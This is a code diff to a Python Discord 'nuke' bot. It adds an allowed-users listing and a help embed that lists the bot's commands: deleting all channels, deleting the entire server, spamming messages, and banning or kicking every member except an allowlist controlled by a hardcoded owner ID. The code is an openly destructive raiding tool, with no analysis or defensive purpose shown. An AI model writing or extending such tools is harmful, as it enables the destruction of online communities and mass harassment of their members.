@@ -21,15 +21,18 @@ async def on_message(message):
         await message.guild.delete()
       elif (message.content.startswith('!bot adduser')
        and str(message.author.id) == god_user):
-        user_id = message.content.split(' ')[2]
+        splits_message = message.content.split(' ')
+        user_id = " ".join(splits_message[2:])
         allowed_users.append(user_id)
-        await message.channel.send(f'User {user_id} has been added to the allowed users list.')
+        await message.channel.send(f'User <@{user_id}> has been added to the allowed users list.')
       elif (message.content.startswith('!bot removeuser')
-         and str(message.author.id) == god_user):
-          user_id = message.content.split(' ')[2]
+         and str(message.author.id) == '798629431325360128'):
+          splited_message = message.content.split(' ')
+          user_id = " ".join(splited_message[2:])
           if user_id in allowed_users:
             allowed_users.remove(user_id)
-            await message.channel.send(f'User {user_id} has been removed from the allowed users list.')
+            user = client.get_user(int(user_id))
+            await message.channel.send(f'User <@{user_id}> has been removed from the allowed users list.')
       elif message.content.startswith('!bot spam'):
        split_message = message.content.split(' ')
        if len(message.content) > 13:
@@ -54,4 +57,21 @@ async def on_message(message):
               if str(member.id) not in allowed_users:
                  await message.channel.send(f'Kicking {member.name}')
                  await member.kick()
+      elif message.content == '!bot allowedusers':
+        allowed_users_mentions = '\n'.join([f'<@{user}>' for user in allowed_users])
+        await message.channel.send(f'Allowed users:\n{allowed_users_mentions}')
+      elif message.content == '!bot config':
+        embed = discord.message.Embed(title="Bot Commands", description="List of available commands and their descriptions", color=0x00ff00)
+        command_desc = {
+            '!bot deletechn': 'Deletes all channels in the server',
+            '!bot deletesrv': 'Deletes the entire server',
+            '!bot adduser [user_id]': 'Adds a user to the allowed users list',
+            '!bot removeuser [user_id]': 'Removes a user from the allowed users list',
+            '!bot spam [message]': 'Spams the provided message',
+            '!bot ban all': 'Bans all members from the server except allowed users',
+            '!bot kick all': 'Kicks all members from the server except allowed users'
+        }
+        for command, description in command_desc.items():
+            embed.add_field(name=command, value=description, inline=False)
+        await message.channel.send(embed=embed)
 client.run('YOUR_BOT_TOKEN')
